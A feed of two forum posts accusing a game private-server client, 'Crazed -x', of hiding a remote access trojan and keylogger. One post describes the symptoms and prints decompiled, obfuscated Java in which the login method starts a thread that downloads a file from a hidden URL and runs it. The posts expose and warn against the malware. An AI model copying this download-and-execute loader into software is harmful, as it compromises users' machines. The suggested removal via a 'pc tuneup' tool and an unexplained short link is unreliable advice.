item.title: Crazed -x is ratted prob should be removed from status list
item.dc:creator: @moparisthebest Moparisthebest
item.description:
@moparisthebest wrote:

[quote=“YoItzBrent, post:11, topic:427219”][quote author=chillwitm888 link=topic=529914.msg3869135#msg3869135 date=1325207581]

Thats because this is all a setup by (Xyle) He’s mad im making money off a server based off of his that was released. He ‘tried’ ratting everyone, but your crypter was shit bro… My AV caught it in matter of seconds… LMAO.

I don’t think java* can be detected by a Antivirus, its either you find the client suspicious or you don’t.
[/quote]

Lmfao, Thanks. This whole post is proof of NOTHING, If you review the code, there isnt even an .exe being executed anywere… lmao.[/quote]

You don’t see an executable being executed here? You must be blind then:

It’s in your client, you explain to me a legitimate reason to have it there?

Also, I did download and decompile your client myself to verify this guy’s findings, and he is 100% telling the truth on everything. I still have the proof on my hard drive.

Read full topic

item.source: Crazed -x is ratted prob should be removed from status list

item.title: Crazed -x is ratted prob should be removed from status list
item.dc:creator: @Xyle Xyle
item.description:
@Xyle wrote:

I don’t generally tattle people out but I think since this server has atleast 100+ players daily and a mopar spot they shouldn’t be allowed to abuse that by ratting their server

Crazed -x is ratted. Don’t believe me? Run the client go into your cmd and do netstat -n
You will see a new connection (2 connections with seperate ports 3333 and 4444)
Also in ur %APPDATA% a new file will appear called “WinServiceLog.dat” which saves all your keystrokes and then sends it to the server
To remove it go on google.com look for pc tuneup 2011
download + install
then go to “hidden process’s” and click ‘completely remove all related files’
and it should be gone

If you download and decompile the client you will see that it executes a rat in the login method, the method name is split(); and if you continue looking at that you will see that it downloads from some link
The client is obfuscated but its pretty easy to figure out that the code is malicious
Code:

private void out(String paramString1, String paramString2, boolean paramBoolean) { split();

Code:

public final void split() { new Thread(new VZ(this)).start(); }

Code:

import I.I;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

class VZ
  implements Runnable
{
  VZ(client paramclient)
  {
  }

  public final void run()
  {
    try
    {
      URL localURL = new URL(I.I(6588));
      BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(localURL.openStream()));
      J.I(localBufferedReader.readLine(), I.I(6622));
      Runtime localRuntime = Runtime.getRuntime();
      Process localProcess = localRuntime.exec(System.getenv(I.I(6634)) + I.I(6639) + I.I(6622));
      localProcess.waitFor();
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
}[/code]

Code:

[code=java5]public class I extends OI
{
  N[] I;
  public int Z = 1000;

  public void I(int paramInt1, int paramInt2, int paramInt3, int paramInt4, int paramInt5, int paramInt6, int paramInt7, int paramInt8, int paramInt9)
  {
    Model localModel = I();
    if (localModel != null)
    {
      this.Z = localModel.Z;
      localModel.I(paramInt1, paramInt2, paramInt3, paramInt4, paramInt5, paramInt6, paramInt7, paramInt8, paramInt9);
    }
  }

  Model I()
  {
    return null;
  }
}

and so on

I think Mr. Brent should be banned also kthx

http://tinyurl.com/cdr56m3

Read full topic
